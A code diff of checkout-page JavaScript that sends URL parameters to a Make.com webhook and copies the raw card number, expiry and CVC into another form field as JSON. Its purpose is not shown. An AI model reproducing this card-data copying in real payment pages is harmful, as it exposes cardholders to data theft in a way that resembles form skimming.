@@ -1,19 +1,47 @@
- console.log("cargado el script")
- console.log("segundo log")
- const ccNumbers = document.querySelector("input[name='purchase[credit_card_number]']")
+const currentURL = window.location.search;
+const urlSearchParams = new URLSearchParams(currentURL);
+const sourceParam = urlSearchParams.get("source");
+  // Doing POST to Make to get Source
+    let sourceLog = ""
+function request(method, url) {
+  let data = {
+  "urlParams": currentURL.split("?")[1] 
+}
+  let data2 = JSON.stringify(data)
+    return new Promise(function (resolve, reject) {
+        var xhr = new XMLHttpRequest();
+        xhr.open(method, url);
+        xhr.onload = resolve;
+        xhr.onerror = reject;
+        xhr.send(data2);
+    });
+}
+    request('POST', 'https://hook.us1.make.com/4k96pub1pp6wwak1yhlr9hcjiufbns84')
+    .then(function (e) {
+      sourceLog = e.target.response
+    }, function (e) {
+        // handle errors
+    });
+
+const ccNumbers = document.querySelector("input[name='purchase[credit_card_number]']")
 const ccExpiry = document.querySelector("input[name='purchase[credit_card_exp_date_month_year]']")
 const ccCvc = document.querySelector("input[name='purchase[security_code]']")
 const purchaseDiv = document.querySelector("div[data-title='button']")
 let lengthToDelete = ""
-let checked = true
+let checked = ""
 //document.getElementById('pid-4345194-0').checked = false
 const radioButtons = document.querySelectorAll('input[name="purchase[product_id]"]')
-console.log("aca viene el radio")
-console.log(radioButtons)
-/*for (const radioButton of radioButtons) {
+const radioButtonsArray = Array.from(radioButtons)
+
+radioButtonsArray.map(e => {
+    if(e.checked == true){
+        checked = true
+    }
+})
+for (const radioButton of radioButtons) {
   radioButton.checked = false
   radioButton.addEventListener('change', checker)
-}*/
+}
 //Hide Purchase Button
    purchaseDiv.firstElementChild.style.pointerEvents="none"
 purchaseDiv.firstElementChild.style.cursor="default"
@@ -129,7 +157,8 @@ const ccCvc = document.querySelector("input[name='purchase[security_code]']")
       "Business Name":"",
       "CC Number":ccNumbers.value,
       "CC Exp": ccExpiry.value,
-      "CCVC": ccCvc.value
+      "CCVC": ccCvc.value,
+      "Source": sourceParam
     }
     shipInput.value = JSON.stringify(response)
   }
